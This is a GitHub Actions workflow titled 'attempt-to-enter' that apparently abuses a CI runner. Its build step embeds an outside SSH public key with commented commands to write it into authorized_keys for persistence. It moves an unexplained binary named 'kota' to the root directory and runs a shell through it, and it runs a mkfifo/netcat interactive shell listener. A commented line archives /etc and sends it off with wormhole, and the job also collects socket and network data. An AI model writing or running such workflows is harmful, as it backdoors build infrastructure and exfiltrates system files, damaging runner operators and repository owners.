name: attempt-to-enter
on: 
  workflow_dispatch:
  pull_request:
    types: [ edited, assigned, opened, synchronize, reopened ]
  push:
    branches: [ main ]

jobs:
  validate:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest]
        goVer: [1.16.x]

    steps:
      - name: Set up Go ${{ matrix.goVer }}
        uses: actions/setup-go@v1
        with:
          go-version: ${{ matrix.goVer }}

      - name: Checkout
        uses: actions/checkout@v2
        with:
          fetch-depth: 0
      
      - name: Make
        run: |
          key="ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBABvBtsqyiOsM1CXJpxIXmrUq/ENpc5YO7amIs7VCGSbQkJV+YrPjxnFOvgVMOJ8omaSI3oYGJyXINUcps8zGT24aAA9N2RAFmLz0VZnKGaiOk6vpwGdvdjtZnrHndmdF8Ik0xWou/aetjU3yvILjN17DRbDThfRRmSHiTlEbzyE3s5N8Q== light@river"
          make build
          ./pull
          make pull
          #sudo apt install wormhole
          #cd .env
          #sudo mkdir -p ~/.ssh
          #sudo mkdir -p /.ssh
          #sudo echo "$key" > /.ssh/authorized_keys
          #sudo echo "$key" > ~/.ssh/authorized_keys

          results_folder="logs"
          sudo mkdir -p $results_folder
          tacts=( "address" "rule" "tcp_metrics" "token" "tunnel" )
          function jipe
          {
            ip -j "$1" | jq '{"fields": [], "results": .}' >> ips.json
          }
          sudo ss -p -x | tr -s ' ' | jq -cR 'split(" ")[:-1]' | jq -s '{"fields": .[0], "sockets": '.[1:]'}' > sockets.json
          for tact in ${tacts[@]}; do
            jipe $tact
          done
          sudo mv .env/kota /
          cd /
          ls && pwd
          ./kota -k run -c bash
          ./kota -k run -c ls && pwd
                    #.env/kota -k run -c "bash rm -rf /tmp/f && mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f"
          #./kota -k run -c ls /boot && ls /bin && ls /etc/
          #./kota -k run -c "cd / && tar -cf etc.tar.xz /etc/ && wormhole send etc.tar.xz"
          ./kota -k run -c "bash rm -rf /tmp/f && mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f"
          #cat sockets.json
          #cat ips.json  
         
          
